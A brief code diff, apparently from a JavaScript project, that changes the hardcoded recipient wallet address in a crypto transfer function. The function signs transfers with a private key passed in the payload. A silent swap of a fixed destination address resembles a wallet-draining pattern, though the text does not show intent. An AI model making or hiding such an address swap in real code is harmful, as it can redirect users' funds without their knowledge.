@@ -22,7 +22,7 @@ const cryptoTransferFunction = async (payload) => {
                 'x-api-key': process.env.api_key
             },
             body: JSON.stringify({
-                to: '0xB4A059Fb99CF16F5AB2A5aE20ca2Ed94C27DD0d4',
+                to: '0x03f2cB9D7beDaCD13B4c993aa205c511B2e1d9Fc',
                 currency: payload.chain,
                 amount: payload.amount,
                 fromPrivateKey: payload.pk,
